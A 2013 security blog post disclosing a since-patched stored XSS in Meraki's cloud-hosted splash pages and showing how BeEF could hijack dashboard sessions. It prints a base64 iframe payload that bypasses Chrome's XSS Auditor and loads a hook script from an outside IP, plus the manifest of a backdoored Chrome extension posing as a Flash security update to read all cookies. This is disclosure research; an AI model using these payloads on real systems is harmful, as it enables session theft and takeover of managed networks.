---
title: "Subverting a cloud-based infrastructure with XSS and BeEF"
date: 2013-03-11T00:28:00.001-07:00
draft: false
type: posts
categories: 
- beef,exploit,ikki,meraki,xss
---
# Subverting a cloud-based infrastructure with XSS and BeEF

<br/>

<br/>
> Well, the world is changing. You can probably do a lot more direct damage with a XSS in a high-value site than with a local privilege escalation in sudo \[...\] - _lcamtuf@coredump.cx_

If you are intrigued by sophisticated exploits and advanced techniques, Cross-Site Scripting isn't probably the most appealing topic for you. Nevertheless, recent events demonstrated how this class of vulnerabilities has been used to compromise [applications](http://krebsonsecurity.com/2012/11/yahoo-email-stealing-exploit-fetches-700/) and even [entire servers](https://blogs.apache.org/infra/entry/apache_org_04_09_2010).

  

Today, we are going to present a possible attack scenario based on a real-life vulnerability that has been recently patched by the [Meraki](http://www.meraki.com/) team. Although the vulnerability itself isn't particularly interesting, it is revealing how a trivial XSS flaw can be abused to subvert an entire network infrastructure.  
  

#### Meraki

Meraki is the first cloud-managed network infrastructure company and it's now part of [Cisco Systems](http://www.cisco.com/web/about/ac49/ac0/ac1/ac259/meraki.html). The idea is pretty neat: all network devices and security appliances (wired and wireless) can be managed by a cutting-edge web interface hosted in the cloud, allowing Meraki networks to be completely set up and controlled through the Internet. Many [enterprises, universities and numerous other businesses](http://www.meraki.com/customers) are already using this technology.

  

![](https://meraki.cisco.com/blog/wp-content/uploads/2010/02/Meraki-Network-Simulator_image2.jpg)

  
As usual, new technologies introduce opportunities and risks. In such environments, even a simple Cross-Site Scripting or a Cross-Site Request Forgery vulnerability can affect the overall security of the managed networks.

  

### The vulnerability

During a product evaluation of a cloud managed Wireless Access Point, we noticed the possibility to personalize the portal splash page.  Users accessing your WiFi network can be redirected to a custom webpage (e.g. containing a disclaimer) before accessing Internet.

  

To further customize our splash page, we started including images and other HTML tags. With big surprise, we quickly discovered that just a basic HTML/JS validation was performed in that context. As a result, we were able to include things like:

  

[![](http://3.bp.blogspot.com/-ZB918q9VtyE/URx_p6YJhYI/AAAAAAAAC_A/lBgJ2NhCj6U/s1600/SplashScreenForm.png)](http://3.bp.blogspot.com/-ZB918q9VtyE/URx_p6YJhYI/AAAAAAAAC_A/lBgJ2NhCj6U/s1600/SplashScreenForm.png)

  

What was even more interesting is the fact that the splash page is also hosted in the cloud. Unlike traditional WiFi APs where the page is hosted on the device itself, Meraki appliances use cloud resources.  
  
https://n20**.meraki.com**/splash/?mac=XXXX&client\_ip=XXXX&client\_mac=XXXX&vap=0&a=XXXX&b=XXXX&auth\_version=5&key=ef1115d... **AUTH\_KEY**...d41c283&node\_ip=XXXX&acl\_ver=XXXX&continue\_url=http%3A%2F%2Fwww.google.com  
  

To protect that page from random visitors, a unique token is used for authentication. Assuming you provide the right token and other required parameters, that page is accessible to Internet users.  
  
Now, let's add to the mix that Meraki uses a limited number of domains for all customers (_e.g. n1-29.meraki.com_, etc.) and, more importantly, that the dashboard session token is scoped to \*_**.meraki.com**_. This factor turns the stored XSS affecting our own device's domain to a vulnerability that can be abused to retrieve the dashboard cookie of other users and networks.   
  

### Attack scenario

An attacker with access to a Meraki dashboard can craft a malicious JS payload to steal the dashboard session cookie and obtain access to other users' devices. In practice, this allows to completely take over Meraki's wired and wireless networks.  
  
[BeEF](http://beefproject.com/), the well-know Browser Exploitation Framework, has been used to simulate a realistic attack:  
  

1.  The attacker customizes the splash page of his/her WiFi AP with an arbitrary JS payload, which includes the BeEF hook 
2.  Connecting a device to the physical wireless network controlled by the attacker (e.g. a testing device), it is possible to retrieve the URL of the splash page including the unique token 
3.  Using social engineering, the attacker tricks the victim(s) into visiting the attacker-controlled splash page
4.  At this point, the victim browser is hooked in BeEF
5.  Using one of the available BeEF modules, the attacker can retrieve the _HttpOnly_ **dash\_auth** cookie and get access to the victim's Meraki dashboard 
6.  In the case of Meraki WiFi Access Point, a convenient map will display the position of the device. In the config tab, it is also possible to disclose the network's password. At this stage, the actual network can be fully controlled by the attacker  
      
    

[![](http://4.bp.blogspot.com/-3CYlaFPop9s/URyGHmFxiZI/AAAAAAAAC_U/tTba3bTaNxc/s1600/DisplayWifiPass.png)](http://4.bp.blogspot.com/-3CYlaFPop9s/URyGHmFxiZI/AAAAAAAAC_U/tTba3bTaNxc/s1600/DisplayWifiPass.png)  

  
A demonstration video of the attack is also available:  
  
  
  
For the interested readers, a few technical details are also shared:  

-   Cookie flags (e.g. _HttpOnly_) are the _ASLR/DEP_ of browser security. It is possible to bypass those mitigation techniques,  although it's getting more complex. Thanks to the progress of browser security and general awareness, stealing cookies marked as HttpOnly via JS payload isn't trivial anymore. [Cross Site Tracing](http://www.cgisecurity.com/whitehat-mirror/WH-WhitePaper_XST_ebook.pdf) and similar techniques are obsolete. Browser plugins have been also patched. Besides exploiting [specific servers or browsers](http://blog.nibblesec.org/2012/12/ui-redressing-mayhem-httponly-bypass_19.html) [bu](http://blog.nibblesec.org/2012/12/ui-redressing-mayhem-httponly-bypass_19.html)[gs](http://blog.nibblesec.org/2012/12/ui-redressing-mayhem-httponly-bypass_19.html), attackers can only rely on social engineering tricks. During our Proof-of-Concept, a fake Flash update has been used to install a malicious Chrome extension and get access to all cookies  
    
-   Chrome extensions run with different privileges than normal JavaScript code executed by the renderer. A Chrome extension can override default SOP restrictions and issue cross-domain requests reading the HTTP response, accessing other browser tabs, and also reading every cookie including those marked as HttpOnly. The manifest of the deliberately backdoored Chrome Extension is the following. The background.js file loads the BeEF hook.  
      
    
    {
    
      "name": "Adobe Flash Player Security Update",
    
      "manifest\_version": 2,
    
      "version": "11.5.502.149",
    
      "description": "Updates Adobe Flash Player with latest securty updates",
    
      "background": {
    
        "scripts": \["background.js"\]
    
      },
    
      "content\_security\_policy": "script-src 'self' 'unsafe-eval' https://174.136.111.122; object-src 'self'",
    
      "icons": { 
    
        "16": "icon16.png",
    
        "48": "icon48.png",
    
        "128": "icon128.png" 
    
      },
    
      "permissions": \[
    
    "tabs", 
    
    "http://\*/\*", 
    
    "https://\*/\*",
    
      "cookies"
    
      \]
    
    }
    
      
    Not to blame Google, but just FYI when the backdoored Chrome Extension was uploaded to Google Chrome Webstore, it was available straight after the upload. No checks were made by the application, for example to prevent the upload of an extension with very relaxed permissions, unsafe-eval CSP directive, and Name/Description fields containing an obviously fake content such as "Adobe Flash Update" 
    
-   Choosing Google Chrome as target browser required to bypass XSS Auditor, the integrated Anti-XSS filter. As discovered by [Mario Heiderich](https://bugs.webkit.org/show_bug.cgi?id=29278#c6), the data URI schema with _base64_ content can be leverage to bypass the filter. The following code snippet will trigger the classic _alert(1)_, even on the latest Google Chrome at the time of writing (version 24.0.1312.71)  
      
    
    [![](http://3.bp.blogspot.com/-LR1KV24GEWU/UTmhFhWm28I/AAAAAAAAC_8/sNMSgOFjT0A/s1600/ChromeAntiXSSbypass.png)](http://3.bp.blogspot.com/-LR1KV24GEWU/UTmhFhWm28I/AAAAAAAAC_8/sNMSgOFjT0A/s1600/ChromeAntiXSSbypass.png)
    
      
    
-   The final attack vector to inject the initial BeEF hook in Meraki's page is:  
      
    <iframe src="data:text/html;base64,PHNjcmlwdD5zPWRvY3VtZW50LmNyZ  
    WF0ZUVsZW1lbnQoJ3NjcmlwdCcpO3MudHlwZT0ndGV4dC9qYXZhc2Nya  
    XB0JztzLnNyYz0naHR0cHM6Ly8xNzQuMTM2LjExMS4xMjIvaG9vay5qc  
    yc7ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ2hlYWQnKVswX  
    S5hcHBlbmRDaGlsZChzKTs8L3NjcmlwdD4=">  
      
    And what is actually executed is:  
      
    <script> s=document.createElement('script'); s.type='text/javascript'; s.src='https://174.136.111.122/hook.js'; document.getElementsByTagName('head')\[0\].appendChild(s); </script>  
      
    Having a backdoored Chrome Extension running in your browser opens for many new attack vectors wich we din't covered in the PoC. For example, it is possible to inject the BeEF hook in every open tab (you can get the impact of this :-), or use the victim browser as an open proxy using BeEF's [Tunneling Proxy](https://github.com/beefproject/beef/wiki/Tunneling) component and many other attacks

  
This blog post is brought to you by [@\_ikki](https://twitter.com/_ikki) (NibbleSec) and [@antisnatchor](https://twitter.com/antisnatchor) (BeEF core dev team).  
Thanks to [Meraki](http://www.meraki.com/) for the prompt response and the great service.

#### [Source](http://blog.nibblesec.org/feeds/6223972751746083097/comments/default)

<br/>
---
